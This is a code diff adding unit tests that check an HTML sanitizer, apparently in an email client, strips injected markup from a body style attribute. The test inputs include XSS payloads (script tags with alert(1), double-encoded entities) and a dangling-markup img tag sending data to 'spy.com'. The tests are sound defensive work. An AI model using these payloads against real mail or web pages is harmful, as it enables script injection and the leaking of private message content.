@@ -80,6 +80,110 @@ describe('protonizer', () => {
     });
 });
 
+describe('protonizer - body style sanitization', () => {
+    const getBodyStyle = (doc: Element) => doc.querySelector('body')?.getAttribute('style');
+
+    it('should preserve a normal body style attribute', () => {
+        const html = '<html><body style="color: red; font-size: 14px;"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        expect(getBodyStyle(result)).toContain('color: red');
+        expect(getBodyStyle(result)).toContain('font-size: 14px');
+    });
+
+    it('should strip script tags injected inside body style', () => {
+        const html = '<html><body style="color: red;<script>alert(1)</script>"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).not.toContain('<script>');
+        expect(bodyStyle).not.toContain('alert');
+        expect(bodyStyle).toContain('color: red');
+    });
+
+    it('should strip closing tags injected inside body style', () => {
+        const html = '<html><body style="color: red;</style>"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).not.toContain('</style>');
+        expect(bodyStyle).toContain('color: red');
+    });
+
+    it('should strip SGML delimiter --> from body style', () => {
+        const html = '<html><body style="color: red;-->"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).not.toContain('-->');
+    });
+
+    it('should strip double quotes decoded from entities in body style', () => {
+        const html = '<html><body style="color: red; &amp;quot;&amp;gt; injected"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).not.toContain('"');
+        expect(bodyStyle).not.toContain('>');
+        expect(bodyStyle).toContain('color: red');
+    });
+
+    it('should strip single quotes from body style values', () => {
+        const html = `<html><body style="color: red; '>injected"><p>Hello</p></body></html>`;
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).not.toContain("'>");
+    });
+
+    it('should filter out non-CSS declarations', () => {
+        const html = '<html><body style="color: red; not-valid-at-all; font-size: 14px;"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).toContain('color: red');
+        expect(bodyStyle).toContain('font-size: 14px');
+        expect(bodyStyle).not.toContain('not-valid-at-all');
+    });
+
+    it('should keep CSS custom properties (double-dash variables)', () => {
+        const html = '<html><body style="--my-var: blue; color: red;"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).toContain('--my-var: blue');
+        expect(bodyStyle).toContain('color: red');
+    });
+
+    it('should strip dangling markup with unclosed tags from body style', () => {
+        const html = `<html><body style="color: red; &quot;&gt;&lt;img src='https://spy.com?whoami="><p>Hello</p></body></html>`;
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).not.toContain('img');
+        expect(bodyStyle).not.toContain('spy.com');
+        expect(bodyStyle).toContain('color: red');
+    });
+
+    it('should strip double-encoded HTML entities hiding tags in body style', () => {
+        const html =
+            '<html><body style="color: red; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        expect(bodyStyle).not.toContain('<script>');
+        expect(bodyStyle).not.toContain('alert');
+        expect(bodyStyle).toContain('color: red');
+    });
+
+    it('should not contain any executable content when style has only script injection', () => {
+        const html = '<html><body style="<script>alert(1)</script>"><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        const bodyStyle = getBodyStyle(result);
+        if (bodyStyle) {
+            expect(bodyStyle).not.toContain('<script>');
+            expect(bodyStyle).not.toContain('alert');
+            expect(bodyStyle).not.toMatch(/[a-z]/i);
+        }
+    });
+
+    it('should handle body with no style attribute', () => {
+        const html = '<html><body><p>Hello</p></body></html>';
+        const result = protonizer(html, true);
+        expect(getBodyStyle(result)).toBeNull();
+    });
+});
+
 describe('sanitizeComposerReply', () => {
     it('should remove all <style> tags from the input element', () => {
         const input = document.createElement('div');
